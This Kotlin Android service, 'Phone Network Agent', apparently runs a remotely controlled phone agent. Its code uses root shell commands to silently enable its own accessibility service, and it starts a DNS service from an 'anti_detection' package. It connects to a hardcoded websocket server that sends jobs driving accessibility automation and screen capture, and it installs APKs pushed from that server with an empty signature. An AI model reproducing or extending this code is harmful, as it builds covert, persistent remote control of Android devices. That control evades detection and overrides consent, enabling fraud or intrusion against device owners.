package com.phonenetwork.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import com.phonenetwork.accessibility.AgentAccessibilityService
import com.phonenetwork.anti_detection.DnsBackgroundService
import com.phonenetwork.automation.AutomationController
import com.phonenetwork.capture.CaptureController
import com.phonenetwork.connection.DirectWsClient
import com.phonenetwork.connection.WifiWatchdog
import com.phonenetwork.executor.JobExecutor
import com.phonenetwork.health.HealthMonitor
import com.phonenetwork.ota.OtaInstaller
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * AgentForegroundService — sticky foreground service, owns all agent components.
 * Uses DirectWs only (no Nostr).
 *
 * Lifecycle:
 *   onCreate()        → create NotificationChannel
 *   onStartCommand()  → startForeground, init components, connect DirectWs
 *   onDestroy()       → disconnect DirectWs, stop DNS, cancel scope
 */
class AgentForegroundService : Service() {

    companion object {
        const val NOTIFICATION_ID = 1001
        const val CHANNEL_ID      = "phone_network_agent"
        const val CHANNEL_NAME    = "Phone Network Agent"
        private const val TAG     = "PhoneNet/FgService"

        @Volatile var instance: AgentForegroundService? = null

        fun start(context: Context) {
            val intent = Intent(context, AgentForegroundService::class.java)
            context.startForegroundService(intent)
        }

        fun stop(context: Context) {
            val intent = Intent(context, AgentForegroundService::class.java)
            context.stopService(intent)
        }

        fun registerAccessibilityService(svc: AgentAccessibilityService) {
            pendingA11y = svc
            instance?.onAccessibilityServiceConnected(svc)
        }

        var pendingA11y: AgentAccessibilityService? = null
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var captureCtrl:    CaptureController
    private lateinit var healthMonitor:  HealthMonitor
    private lateinit var otaInstaller:   OtaInstaller
    private lateinit var automation:      AutomationController
    private lateinit var jobExecutor:     JobExecutor
    private          var directWsClient: DirectWsClient? = null
    private lateinit var wifiWatchdog:    WifiWatchdog

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "Service created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Service starting (startId=$startId)")

        startForeground(NOTIFICATION_ID, buildNotification("Connecting…"))

        initComponents()
        DnsBackgroundService.start(serviceScope)

        wifiWatchdog = WifiWatchdog(applicationContext, serviceScope) { _ ->
            // HealthMonitor sends via DirectWs heartbeat automatically
        }
        wifiWatchdog.start()

        enableAccessibilityServiceViaRoot()
        pendingA11y?.let { onAccessibilityServiceConnected(it) }

        // Retry accessibility enablement after delay (system may not pick up secure settings immediately)
        serviceScope.launch {
            delay(3000)
            if (pendingA11y == null) {
                Log.w(TAG, "A11y not connected after 3s — retrying enablement")
                enableAccessibilityServiceViaRoot()
            }
        }

        // Configure DirectWs auto-discovery
        Log.i(TAG, "Configuring DirectWs auto-discovery")
        val prefs = applicationContext.getSharedPreferences("phone_network_direct", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("direct_ws_url", "ws://enkzoned.go.ro:3000/ws-direct")
            .putString("direct_ws_device_key", "")
            .putBoolean("direct_ws_enabled", true)
            .apply()

        // Start DirectWs transport
        serviceScope.launch {
            try {
                val dwc = DirectWsClient(
                    context    = applicationContext,
                    executor   = jobExecutor,
                    scope      = serviceScope,
                    onConnected = { deviceId ->
                        Log.i(TAG, "DirectWs connected: deviceId=$deviceId")
                        updateNotification("Connected (DirectWs)")
                    },
                    onDisconnected = {
                        Log.i(TAG, "DirectWs disconnected")
                        updateNotification("Disconnected — reconnecting…")
                    },
                    onOtaUpdate = { version, versionCode, apkUrl, apkSha256, mandatory ->
                        Log.i(TAG, "OTA update available: $version (code=$versionCode)")
                        updateNotification("Downloading update $version…")
                        serviceScope.launch {
                            try {
                                val result = otaInstaller.downloadVerifyInstall(
                                    apkUrl          = apkUrl,
                                    expectedSha256   = apkSha256,
                                    signature        = "",
                                    versionCode      = versionCode,
                                    forceDowngrade   = false
                                )
                                Log.i(TAG, "OTA update result: $result")
                                updateNotification("Update applied — restart to activate")
                            } catch (e: Exception) {
                                Log.e(TAG, "OTA update error: ${e.message}")
                                updateNotification("Update failed")
                            }
                        }
                    },
                )
                directWsClient = dwc
                dwc.connect()
                Log.i(TAG, "DirectWsClient started")
            } catch (e: Exception) {
                Log.e(TAG, "DirectWsClient failed: ${e.message}")
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        Log.i(TAG, "Service stopping")
        instance = null
        directWsClient?.disconnect()
        if (::wifiWatchdog.isInitialized)  wifiWatchdog.stop()
        DnsBackgroundService.stop()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun enableAccessibilityServiceViaRoot() {
        val component = "$packageName/${AgentAccessibilityService::class.java.name}"
        try {
            val current = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            Log.i(TAG, "A11y: current services='$current', target='$component'")
            if (component in current) {
                Log.i(TAG, "A11y service already enabled")
                return
            }
            // Clean approach: use separate su commands to avoid shell quoting issues
            // First, build the new list (keep existing non-conflicting services)
            val parts = current.split(":").filter { it.isNotEmpty() }.toMutableList()
            // Remove old package references (com.phonenetwork.debug or com.phonenetwork)
            val oldPrefixes = listOf("com.phonenetwork.debug/", "com.phonenetwork/")
            parts.removeAll { part -> oldPrefixes.any { prefix -> part.startsWith(prefix) } }
            parts.add(component)
            val newList = parts.joinToString(":")
            Log.i(TAG, "A11y: setting services='$newList'")

            // Use separate commands to avoid quoting issues with su -c
            val cmd1 = "settings put secure enabled_accessibility_services $newList"
            val cmd2 = "settings put secure accessibility_enabled 1"
            runRootCommand(cmd1)
            runRootCommand(cmd2)

            // Verify it was set
            Thread.sleep(500)
            val verify = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            if (component in verify) {
                Log.i(TAG, "A11y: VERIFIED service enabled")
            } else {
                Log.w(TAG, "A11y: VERIFICATION FAILED — got='$verify'")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to enable a11y via root: ${e.message}")
        }
    }

    private fun runRootCommand(cmd: String): Int {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val exitCode = proc.waitFor()
            val stdout = proc.inputStream.bufferedReader().readText().trim()
            val stderr = proc.errorStream.bufferedReader().readText().trim()
            if (stdout.isNotEmpty()) Log.i(TAG, "root[$cmd] stdout: $stdout")
            if (stderr.isNotEmpty()) Log.w(TAG, "root[$cmd] stderr: $stderr")
            Log.i(TAG, "root[$cmd] exit=$exitCode")
            exitCode
        } catch (e: Exception) {
            Log.w(TAG, "root[$cmd] exception: ${e.message}")
            -1
        }
    }

    private fun initComponents() {
        val ctx = applicationContext

        captureCtrl    = CaptureController()
        healthMonitor  = HealthMonitor(ctx)
        otaInstaller   = OtaInstaller(ctx)
        automation     = AutomationController(service = null)

        jobExecutor = JobExecutor(
            context      = ctx,
            automation   = automation,
            capture      = captureCtrl,
            otaInstaller = otaInstaller,
        )
    }

    private fun onAccessibilityServiceConnected(svc: AgentAccessibilityService) {
        Log.i(TAG, "AccessibilityService connected")
        if (::jobExecutor.isInitialized) {
            jobExecutor.setAccessibilityService(svc)
            automation = AutomationController(service = svc)
            jobExecutor.setAutomationController(automation)
            Log.i(TAG, "AutomationController wired to A11yService")
        }
        updateNotification("Connected")
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Phone Network Agent"
            setShowBadge(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)
    }

    fun updateNotification(status: String) {
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIFICATION_ID, buildNotification(status))
    }

    private fun buildNotification(status: String): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Phone Network Agent")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
}
